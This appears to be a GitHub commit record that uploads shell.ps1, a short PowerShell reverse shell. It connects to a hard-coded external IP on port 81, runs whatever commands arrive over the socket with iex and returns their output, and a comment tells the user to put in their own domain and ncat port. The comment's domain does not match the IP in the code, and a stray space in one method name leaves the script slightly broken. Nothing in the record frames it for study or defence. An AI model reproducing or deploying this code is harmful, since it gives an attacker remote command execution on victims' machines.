d73c2f2ef3ed240361d7db9eb8da5f8be8524a25
dyaa1997dyaa <119899779+dyaa1997dyaa@users.noreply.github.com>
2023-08-18 03:35:44 +0300

    Add files via upload

---
+++ shell.ps1
@@ -0,0 +1,3 @@
+#Change the domain name "shell.theboss.lol" to your domain name and the port number "81" to the port number ncat is listening to:
+$sm=(New-Object Net.Sockets.TCPClient('51.91.154.146',81)).GetStream();[byte[]]
+$bt=0..65535|%{0};while(($i=$sm.Re ad($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
